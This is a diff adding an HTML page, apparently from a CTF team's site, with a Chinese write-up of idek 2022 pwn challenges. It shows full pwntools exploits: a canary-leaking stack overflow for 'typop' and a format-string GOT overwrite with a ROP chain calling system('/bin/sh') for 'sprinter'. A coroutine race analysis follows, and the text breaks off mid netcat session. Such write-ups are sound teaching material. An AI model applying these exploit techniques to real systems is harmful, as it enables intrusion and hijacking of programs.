@@ -1,0 +1,1658 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <link rel="apple-touch-icon" sizes="180x180" href="/assets/img/logo.png">
+    <link rel="icon" type="image/png" sizes="192x192"  href="/assets/img/logo.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/assets/img/logo.png">
+    <meta name="msapplication-TileColor" content="#ffffff">
+    <meta name="msapplication-TileImage" content="/ms-icon-144x144.png">
+    <meta name="theme-color" content="#ffffff">
+    <title>idek 2022* Pwn &amp;&amp; Reverse Writeup | r3kapig</title>
+    <meta property="og:title" content="r3kapig writeup" />
+    <meta property="og:locale" content="en_US" />
+    <meta name="description" content="Writeup for idek 2022* Pwn &amp;&amp; Reverse Writeup" />
+    <meta property="og:description" content="Writeup for idek 2022* Pwn &amp;&amp; Reverse Writeup" />
+    <link rel="canonical" href="https://r3kapig.com/writeup/" />
+    <meta property="og:url" content="https://r3kapig.com/writeup/" />
+    <meta property="og:site_name" content="r3kapig" />
+    <link type="text/css" rel="stylesheet" href="../assets/css/github-markdown.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/pilcrow.css">
+    <link type="text/css" rel="stylesheet" href="../assets/css/hljs-github.min.css"/>
+    <link type="text/css" rel="stylesheet" href="../assets/css/bootstrap-4.0.0-beta.3.min.css">
+    <script type="text/javascript" src="../assets/js/jquery-3.3.1.slim.min.js"></script>
+    <script type="text/javascript" src="../assets/js/bootstrap-4.0.0-beta.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/popper-1.14.3.min.js"></script>
+    <script type="text/javascript" src="../assets/js/mathjax-2.7.4/MathJax.js?config=TeX-MML-AM_CHTML"></script>
+  </head>
+  <style>
+  body {
+      padding-top: 56px;
+  }
+
+  .sticky-offset {
+      top: 56px;
+  }
+
+  #body-row {
+      margin-left:0;
+      margin-right:0;
+  }
+  #sidebar-container {
+      min-height: 100vh;   
+      background-color: #333;
+      padding: 0;
+  }
+
+  /* Sidebar sizes when expanded and expanded */
+  .sidebar-expanded {
+      width: 230px;
+  }
+  .sidebar-collapsed {
+      width: 60px;
+  }
+
+  /* Menu item*/
+  #sidebar-container .list-group a {
+      min-height: 50px;
+      color: white;
+  }
+
+  /* Submenu item*/
+  #sidebar-container .list-group .sidebar-submenu a {
+      min-height: 45px;
+      padding-left: 60px;
+  }
+  .sidebar-submenu {
+      font-size: 0.9rem;
+  }
+
+  /* Separators */
+  .sidebar-separator-title {
+      background-color: #333;
+      height: 35px;
+  }
+  .sidebar-separator {
+      background-color: #333;
+      height: 25px;
+  }
+  .logo-separator {
+      background-color: #333;    
+      height: 60px;
+  }
+
+
+  /* 
+   active scrollspy
+  */
+  .list-group-item.active {
+    border-color: transparent;
+    border-left: #e69138 solid 4px;
+  }
+
+  /* 
+   anchor padding top
+   https://stackoverflow.com/a/28824157
+  */
+  :target:before {
+    content:"";
+    display:block;
+    height:56px; /* fixed header height*/
+    margin:-56px 0 0; /* negative fixed header height */
+  }
+  </style>
+  
+  <script>
+  // https://stackoverflow.com/a/48330533
+  $(window).on('activate.bs.scrollspy', function (event) {
+    let active_collapse = $($('.list-group-item.active').parents()[0]);
+    $(".collapse").removeClass("show");
+    active_collapse.addClass("show");
+
+    let parent_menu = $('a[href="#' + active_collapse[0].id + '"]');
+    $('a[href^="#submenu"]').css("border-left", "");
+    parent_menu.css("border-left","#e69138 solid 4px");
+  });
+
+  // http://docs.mathjax.org/en/latest/tex.html#tex-and-latex-math-delimiters
+  MathJax.Hub.Config({
+    tex2jax: {
+      inlineMath: [['$','$'], ['\\(','\\)']],
+      processEscapes: true
+    }
+  });
+  </script>
+
+  <body style="position: relative;" data-spy="scroll" data-target=".sidebar-submenu" data-offset="70">
+    <nav class="navbar navbar-expand-md navbar-light bg-light fixed-top">
+      <button class="navbar-toggler navbar-toggler-right" type="button" data-toggle="collapse" data-target="#navbarNavDropdown" aria-controls="navbarNavDropdown" aria-expanded="false" aria-label="Toggle navigation">
+        <span class="navbar-toggler-icon"></span>
+      </button>
+      <a class="navbar-brand" href="../">
+        <img src="https://r3kapig.com/assets/img/logo.png" class="d-inline-block align-top" alt="" width="30" height="30">
+        <span class="menu-collapsed">r3kapig / writeup</span>
+      </a>
+      <div class="collapse navbar-collapse" id="navbarNavDropdown">
+        <ul class="navbar-nav my-2 my-lg-0">
+            
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                前言
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                pwn
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#typop">typop</a>
+    
+                <a class="dropdown-item" href="#sprinter">sprinter</a>
+    
+                <a class="dropdown-item" href="#coroutine">coroutine</a>
+    
+                <a class="dropdown-item" href="#relativity">relativity</a>
+    
+                <a class="dropdown-item" href="#weep">weep</a>
+    
+                <a class="dropdown-item" href="#sofiregood">sofiregood</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                reverse
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                                <a class="dropdown-item" href="#polyglot">polyglot</a>
+    
+                <a class="dropdown-item" href="#side-effect">side-effect</a>
+    
+                <a class="dropdown-item" href="#sus-meow">sus-meow</a>
+    
+              </div>
+            </li>
+    
+            <li class="nav-item dropdown d-sm-block d-md-none">
+              <a class="nav-link dropdown-toggle" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false">
+                结语
+              </a>
+              <div class="dropdown-menu" aria-labelledby="smallerscreenmenu">
+                
+              </div>
+            </li>
+    
+        </ul>
+      </div>
+      <div class="order-3 dual-collapse2"> <!-- navbar-collapse w100 collapse -->
+        <ul class="navbar-nav ml-auto" style="flex-direction: row;">
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=watch&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+          <iframe src="https://ghbtns.com/github-btn.html?user=r3kapig&repo=writeup&type=star&count=true&size=large&v=2" frameborder="0" scrolling="0" width="160px" height="30px"></iframe>
+        </ul>
+      </div>
+    </nav>
+    <div class="row" id="body-row">
+      <div id="sidebar-container" class="sidebar-expanded d-none d-md-block col-2">
+        <ul class="list-group sticky-top sticky-offset">
+          
+          <a href="#submenu0" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">前言</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu0" class="collapse sidebar-submenu">
+            
+          </div>
+    
+          <a href="#submenu1" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">pwn</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu1" class="collapse sidebar-submenu">
+            <a href="#typop" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">typop</span>
+            </a>
+    
+<a href="#sprinter" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">sprinter</span>
+            </a>
+    
+<a href="#coroutine" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">coroutine</span>
+            </a>
+    
+<a href="#relativity" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">relativity</span>
+            </a>
+    
+<a href="#weep" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">weep</span>
+            </a>
+    
+<a href="#sofiregood" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">sofiregood</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu2" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">reverse</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu2" class="collapse sidebar-submenu">
+            <a href="#polyglot" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">polyglot</span>
+            </a>
+    
+<a href="#side-effect" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">side-effect</span>
+            </a>
+    
+<a href="#sus-meow" class="list-group-item list-group-item-action text-white bg-dark">
+              <span class="menu-collapsed">sus-meow</span>
+            </a>
+    
+          </div>
+    
+          <a href="#submenu3" data-toggle="collapse" aria-expanded="false" class="list-group-item list-group-item-action flex-column align-items-start bg-dark">
+            <div class="d-flex w-100 justify-content-start align-items-center font-weight-bold">
+              <span class="fa fa-dashboard fa-fw mr-3"></span>
+              <span class="menu-collapsed">结语</span>
+              <span class="submenu-icon ml-auto"></span>
+            </div>
+          </a>
+          <div id="submenu3" class="collapse sidebar-submenu">
+            
+          </div>
+    
+        </ul>
+      </div>
+      <div class="col-10 py-3">
+        <article class="markdown-body"><h1 id="idek-2022-pwn--reverse-writeup"><a class="header-link" href="#idek-2022-pwn--reverse-writeup"></a>idek 2022* Pwn &amp;&amp; Reverse Writeup</h1>
+<h2 id="前言"><a class="header-link" href="#前言"></a>前言:</h2>
+<p>idek* 2022有一些有趣的pwn和reverse题目.pwn差了一个题目AK,reverse差得比较多.之后有时间再进行相关的总结.另外有兴趣打国际赛的小伙伴.欢迎简历<code>root@r3kapig.com</code>,欢迎更多reverse,pwn,crypto,web的小伙伴.</p>
+<p class="img-container"><img src="https://i.imgur.com/nvVnauC.png" alt=""></p>
+<h2 id="pwn"><a class="header-link" href="#pwn"></a>Pwn:</h2>
+<h3 id="typop"><a class="header-link" href="#typop"></a>Typop:</h3>
+<p>一道栈溢出pwn题，存在一个后门函数vuln，但是需要控制a1,a2,a3三个参数，泄露canary和pie以及栈地址后，通过修改rbp来跳转到后门函数，通过栈地址控制filename为flag</p>
+<p class="img-container"><img src="https://i.imgur.com/unadfwC.png" alt=""></p>
+<p>exp:</p>
+<pre class="hljs"><code> <span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+
+p = process(<span class="hljs-string">&#x27;./chall&#x27;</span>)
+<span class="hljs-comment">#p=remote(&#x27;typop.chal.idek.team&#x27;,1337)</span>
+<span class="hljs-comment"># libc=ELF(&#x27;./libc.so.6&#x27;)</span>
+<span class="hljs-comment">#context.log_level = &#x27;debug&#x27;</span>
+context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span>
+r = <span class="hljs-keyword">lambda</span> x: p.recv(x)
+ra = <span class="hljs-keyword">lambda</span>: p.recvall()
+rl = <span class="hljs-keyword">lambda</span>: p.recvline(keepends=<span class="hljs-literal">True</span>)
+ru = <span class="hljs-keyword">lambda</span> x: p.recvuntil(x, drop=<span class="hljs-literal">True</span>)
+sl = <span class="hljs-keyword">lambda</span> x: p.sendline(x)
+sa = <span class="hljs-keyword">lambda</span> x, y: p.sendafter(x, y)
+sla = <span class="hljs-keyword">lambda</span> x, y: p.sendlineafter(x, y)
+ia = <span class="hljs-keyword">lambda</span>: p.interactive()
+c = <span class="hljs-keyword">lambda</span>: p.close()
+li = <span class="hljs-keyword">lambda</span> x: log.info(x)
+db = <span class="hljs-keyword">lambda</span>: gdb.attach(p)
+gdb.attach(p,<span class="hljs-string">&#x27;b* $rebase(0x138E)&#x27;</span>)
+sla(<span class="hljs-string">&#x27;Do you want to complete a survey?&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>)
+
+sa(<span class="hljs-string">&#x27;Do you like ctf?&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">11</span>)
+ru(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">10</span>)
+canary=u64(p.recv(<span class="hljs-number">8</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x61</span>
+info(<span class="hljs-string">&#x27;canary-&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(canary))
+stackaddr=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))
+sa(<span class="hljs-string">&#x27;Can you provide some extra feedback?&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">10</span>+p64(canary))
+info(<span class="hljs-string">&#x27;stack-&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(stackaddr))
+sla(<span class="hljs-string">&#x27;Do you want to complete a survey?&#x27;</span>,<span class="hljs-string">&#x27;y&#x27;</span>)
+sa(<span class="hljs-string">&#x27;Do you like ctf?&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1a</span>)
+ru(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x1a</span>)
+textaddr=u64(p.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">&#x27;\x00&#x27;</span>))-<span class="hljs-number">0x1447</span>
+info(<span class="hljs-string">&#x27;text-&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(textaddr))
+target=<span class="hljs-number">0x1273</span>+textaddr
+sa(<span class="hljs-string">&#x27;Can you provide some extra feedback?&#x27;</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">10</span>+p64(canary)+p64(stackaddr+<span class="hljs-number">0x6c</span>)+p64(target)+<span class="hljs-string">&#x27;a\x00\x00\x00&#x27;</span>+<span class="hljs-string">&#x27;l\x00\x00\x00&#x27;</span>+<span class="hljs-string">&#x27;f\x00\x00\x00&#x27;</span>)
+p.interactive()</code></pre><h3 id="sprinter"><a class="header-link" href="#sprinter"></a>Sprinter:</h3>
+<p>由于Sprintf的format和dest参数相同，因此存在边解析边copy的情况，因此我们可以用%s+\x00来绕过strchr对于n字符的过滤，通过\x00来绕过strchr的检测，然后通过%s来覆写掉我们的\x00。这样我们就可以使用%n。然后改返回地址为vuln函数中的0x401209（这里我没注意，返回的是一个非程序本身的gadget，不过还是能执行，返回0x40120e应该也行），同时更改掉strchr的got表。
+由于fgets有0x100的长度，我有几个思路：</p>
+<ol class="list">
+<li>更改stack_chk_fail函数的got表为ret，然后利用字符串末尾的%s实现栈溢出，不过由于我们实现ROP途中很多地址带0，%s不太好造成能够覆盖一条ROP链的溢出。</li>
+<li>更改strchr got表为printf，重回vuln函数之后可以造成裸的printf的格式化字符串漏洞。这里由于printf_plt末尾为\xd0，我们一共只有0x100的长度，不够用。因此也放弃。</li>
+<li>更改strchr got表为pop1_ret的gadget，然后可执行ROP链，这里仍需注意：我最开始更改的是pop6_ret的gadget，这会导致重回vuln函数失败。然后就是普通的泄露libc基址后调用system+/bin/sh提权。（由于栈错位，这里fgets读取的输入会覆盖掉fgets的返回地址，因此不用再触发strchr即可控制程序执行流）。</li>
+</ol>
+<p>exp:</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+context.terminal = [<span class="hljs-string">&#x27;gnome-terminal&#x27;</span>, <span class="hljs-string">&#x27;-x&#x27;</span>, <span class="hljs-string">&#x27;sh&#x27;</span>, <span class="hljs-string">&#x27;-c&#x27;</span>]
+context.log_level = <span class="hljs-string">&#x27;debug&#x27;</span>
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">qwq</span>(<span class="hljs-params">name</span>):</span>
+  log.success(<span class="hljs-built_in">hex</span>(name))
+
+<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span>(<span class="hljs-params">point</span>):</span>
+  gdb.attach(r,<span class="hljs-string">&#x27;b &#x27;</span>+<span class="hljs-built_in">str</span>(point))
+
+r = process(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/idek/sprinter/vuln&#x27;</span>)
+<span class="hljs-comment"># r = remote(&#x27;sprinter.chal.idek.team&#x27;,1337)</span>
+elf =ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/idek/sprinter/vuln&#x27;</span>)
+libc = ELF(<span class="hljs-string">&#x27;/mnt/hgfs/ubuntu/idek/sprinter/libc-2.31.so&#x27;</span>)
+
+r.recvuntil(<span class="hljs-string">b&quot;Enter your string into my buffer, located at &quot;</span>)
+stack_addr = <span class="hljs-built_in">int</span>(r.recvuntil(<span class="hljs-string">b&#x27;:&#x27;</span>)[:-<span class="hljs-number">1</span>],<span class="hljs-number">16</span>)
+target_addr = stack_addr-<span class="hljs-number">8</span>
+
+debug(<span class="hljs-string">&quot;sprintf&quot;</span>)
+<span class="hljs-comment"># debug(&quot; *0x401245&quot;)</span>
+<span class="hljs-comment"># gdb.attach(r)</span>
+
+
+<span class="hljs-comment"># payload = b&#x27;%sa\x00%&#x27;+b&#x27;b&#x27;*0x3+b&#x27;c%9$hhn&#x27;+b&#x27;bbbbbbb&#x27;+b&#x27;%33$hhn&#x27;</span>
+payload = <span class="hljs-string">b&#x27;%sa\x00%&#x27;</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*<span class="hljs-number">0x3</span>+<span class="hljs-string">b&#x27;c%31$hhn&#x27;</span>+<span class="hljs-string">b&#x27;%bbbbbbbbc&#x27;</span>+<span class="hljs-string">b&#x27;%33$hhn&#x27;</span>+<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x30</span>-<span class="hljs-number">5</span>)+<span class="hljs-string">b&#x27;c%34$n&#x27;</span>+<span class="hljs-string">b&#x27;%&#x27;</span>+<span class="hljs-string">b&#x27;b&#x27;</span>*(<span class="hljs-number">0x26</span>+<span class="hljs-number">0xc</span>-<span class="hljs-number">2</span>)+<span class="hljs-string">b&#x27;c%32$hhn&#x27;</span>
+payload=payload.ljust(<span class="hljs-number">0xd0</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)
+payload=payload+p64(target_addr)+p64(elf.got[<span class="hljs-string">&quot;strchr&quot;</span>])+p64(elf.got[<span class="hljs-string">&quot;strchr&quot;</span>]+<span class="hljs-number">1</span>)+p64(elf.got[<span class="hljs-string">&quot;strchr&quot;</span>]+<span class="hljs-number">2</span>)
+<span class="hljs-comment">#printf_plt = 0x4010d0</span>
+<span class="hljs-comment">#pop5_ret = 0x401366</span>
+
+r.sendline(payload)
+<span class="hljs-comment"># r.recvuntil(b&#x27;(&#x27;)</span>
+pause()
+pop_rdi = <span class="hljs-number">0x0000000000401373</span>
+leak_payload = p64(pop_rdi)+p64(elf.got[<span class="hljs-string">&quot;fgets&quot;</span>])+p64(elf.plt[<span class="hljs-string">&quot;printf&quot;</span>])+p64(<span class="hljs-number">0x40122F</span>)
+r.sendline(leak_payload)
+libc_base = u64(r.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:].ljust(<span class="hljs-number">0x8</span>,<span class="hljs-string">b&#x27;\0&#x27;</span>))-libc.sym[<span class="hljs-string">&quot;fgets&quot;</span>]
+system_addr = libc_base+libc.sym[<span class="hljs-string">&quot;system&quot;</span>]
+pause()
+r.sendline(<span class="hljs-string">b&#x27;/bin/sh\x00&#x27;</span>+<span class="hljs-string">b&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>+p64(pop_rdi+<span class="hljs-number">1</span>)+p64(pop_rdi)+p64(stack_addr)+p64(system_addr))
+
+qwq(stack_addr)
+qwq(libc_base)
+r.interactive()</code></pre><h3 id="coroutine"><a class="header-link" href="#coroutine"></a>Coroutine:</h3>
+<p>考的 C++20 协程，可以参考这个来理解流程</p>
+<ol class="list">
+<li>C++20协程原理和应用(<a href="https://zhuanlan.zhihu.com/p/497224333">https://zhuanlan.zhihu.com/p/497224333</a>)</li>
+<li>C++ 协程——实战演示 - Incredibuild(<a href="https://www.incredibuild.cn/blog/cppxiechengshizhanyanshi">https://www.incredibuild.cn/blog/cppxiechengshizhanyanshi</a>)
+保护全开，代码中有将 flag 加载进栈上的操作。初步怀疑是竞争问题或者逻辑漏洞，肯定不是内存安全。</li>
+</ol>
+<p>大概推测可能跟协程引用了被换掉的 buffer 地址有关。</p>
+<p>漏洞点是这里（里面的 printf 都是我自己加的）：</p>
+<pre class="hljs"><code><span class="hljs-function">Task&lt;<span class="hljs-keyword">bool</span>&gt; <span class="hljs-title">SendAllAsyncNewline</span><span class="hljs-params">(io_context&amp; ctx, <span class="hljs-keyword">int</span> socket, std::span&lt;std::byte&gt; buffer)</span>
+</span>{
+    std::byte buffer2[<span class="hljs-number">513</span>];
+    <span class="hljs-comment">// buffer 堆地址</span>
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SendAllAsyncNewline buffer: %p\n&quot;</span>, buffer.<span class="hljs-built_in">data</span>());
+    <span class="hljs-comment">// buffer2 栈地址，这块地址会跟存放 flag 的栈地址重叠</span>
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SendAllAsyncNewline buffer2: %p\n&quot;</span>, buffer2);
+    std::<span class="hljs-built_in">copy</span>(buffer.<span class="hljs-built_in">begin</span>(), buffer.<span class="hljs-built_in">end</span>(), buffer2);
+    buffer2[buffer.<span class="hljs-built_in">size</span>()] = (std::byte)<span class="hljs-string">&#x27;\n&#x27;</span>;
+    
+    <span class="hljs-keyword">return</span> <span class="hljs-built_in">SendAllAsync</span>(ctx, socket, std::<span class="hljs-built_in">span</span>(buffer2, buffer.<span class="hljs-built_in">size</span>()+<span class="hljs-number">1</span>));
+}
+
+<span class="hljs-function">Task&lt;<span class="hljs-keyword">bool</span>&gt; <span class="hljs-title">SendAllAsync</span><span class="hljs-params">(io_context&amp; ctx, <span class="hljs-keyword">int</span> socket, std::span&lt;std::byte&gt; buffer)</span>
+</span>{    
+    <span class="hljs-comment">// 这里的 buffer 是栈地址</span>
+    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SendAllAsync origin buffer: %p\n&quot;</span>, buffer.<span class="hljs-built_in">data</span>());
+    <span class="hljs-keyword">int</span> offset = <span class="hljs-number">0</span>;
+    <span class="hljs-comment">// 如果没有完全写入，则会重新写</span>
+    <span class="hljs-keyword">while</span> (offset &lt; buffer.<span class="hljs-built_in">size</span>())
+    {
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SendAllAsync before SendAsync buffer: %p\n&quot;</span>, buffer.<span class="hljs-built_in">data</span>() + offset);
+        <span class="hljs-keyword">int</span> result = <span class="hljs-keyword">co_await</span> <span class="hljs-built_in">SendAsync</span>(ctx, socket, std::<span class="hljs-built_in">span</span>(buffer.<span class="hljs-built_in">data</span>() + offset, buffer.<span class="hljs-built_in">size</span>() - offset));
+        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;SendAsync result: %d(%x)&quot;</span>, result, result);
+        <span class="hljs-keyword">if</span> (result == <span class="hljs-number">-1</span>)
+        {
+            <span class="hljs-keyword">co_return</span> <span class="hljs-literal">false</span>;
+        }
+
+        offset += result;
+    }
+    <span class="hljs-keyword">co_return</span> <span class="hljs-literal">true</span>;
+}</code></pre><p>由于SendAllAsyncNewline函数传给 SendAllAsync函数中 SendAsync 协程的那个 buffer 是<strong>一个和 flag 重叠的栈地址</strong>，因此只要能在 SendAllAsync 函数中 while 循环里做一次竞争，就能把 flag 打出来（理论上）</p>
+<p>这里的竞争是这样的：</p>
+<ol class="list">
+<li>设置 proxy 的接收窗口</li>
+<li>多次让 bin 向 proxy 发送大量数据，填充 proxy 的接收窗口至将满时（<strong>不要全满，留一两个字节左右</strong>）（<strong>注意 proxy 自始自终不要去读取，也就是第五个选项不要点</strong>）</li>
+<li>接下来继续，调用 SendAsync 发送<strong>512字节数据（即把发送数据的大小拉满）</strong>给 proxy，由于这是该函数第一次循环 SendAsync，因此这里 buffer 中的数据仍然是被 copy 后的无效数据。而又由于前两步已经使得 proxy 发送窗口很小了（只剩下几个字节）。因此循环的第一次 SendAsync 只会成功发送几个字节，之后进入循环的第二次 SendAsync  调用，发送失败返回 EAGAIN，协程挂起，返回至 run_until_return 函数。</li>
+<li>控制流从 run_until_return 函数执行完协程后，调用 load flag 将 flag 加载至栈上</li>
+<li>Proxy 大量 recv，空出 proxy 的接收窗口</li>
+<li>控制流在 run_until_return 函数中发现接收窗口空出，调用先前被挂起的协程，协程SendAsync继续尝试发送 buffer 数据。由于这里竞争成功加载进了 flag，因此这里的 buffer 中是会含有 flag 的，发送给 proxy，获取到 flag。</li>
+</ol>
+<p>exp:</p>
+<pre class="hljs"><code>➜  attachments nc coroutine.chal.idek.team <span class="hljs-number">1337</span>
+== proof-of-work: disabled ==
+Select Option:
+<span class="hljs-number">1.</span> Connect
+<span class="hljs-number">2.</span> Change Receive Buffer
+<span class="hljs-number">3.</span> Change Send Buffer
+<span class="hljs-number">4.</span> Send data
+<span class="hljs-number">5.</span> Receive data
+&gt; <span class="hljs-number">2</span>
+Buffer size&gt; <span class="hljs-number">1</span>
+Select Option:
+<span class="hljs-number">1.</span> Connect
+<span class="hljs-number">2.</span> Change Receive Buffer
+<span class="hljs-number">3.</span> Change Send Buffer
+<span class="hljs-number">4.</span> Send data
+<span class="hljs-number">5.</span> Receive data
+&gt; <span class="hljs-number">1</span>
+Select Option:
+<span class="hljs-number">1.</span> Connect
+<span class="hljs-number">2.</span> Change Receive Buffer
+<span class="hljs-number">3.</span> Change Send Buffer
+<span class="hljs-number">4.</span> Send data
+<span class="hljs-number">5.</span> Receive data
+&gt; <span class="hljs-number">4</span>
+Data&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Select Option:
+<span class="hljs-number">1.</span> Connect
+<span class="hljs-number">2.</span> Change Receive Buffer
+<span class="hljs-number">3.</span> Change Send Buffer
+<span class="hljs-number">4.</span> Send data
+<span class="hljs-number">5.</span> Receive data
+&gt; <span class="hljs-number">4</span>
+Data&gt; aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
+Select Option:
+<span class="hljs-number">1.</span> Connect
+<span class="hljs-number">2.</span> Change Receive Buffer
+<span class="hljs-number">3.</span> Change Send Buffer
+<span class="hljs-number">4.</span> Send data
+<span class="hljs-number">5.</span> Receive data
+&gt; <span class="hljs-number">4</span>
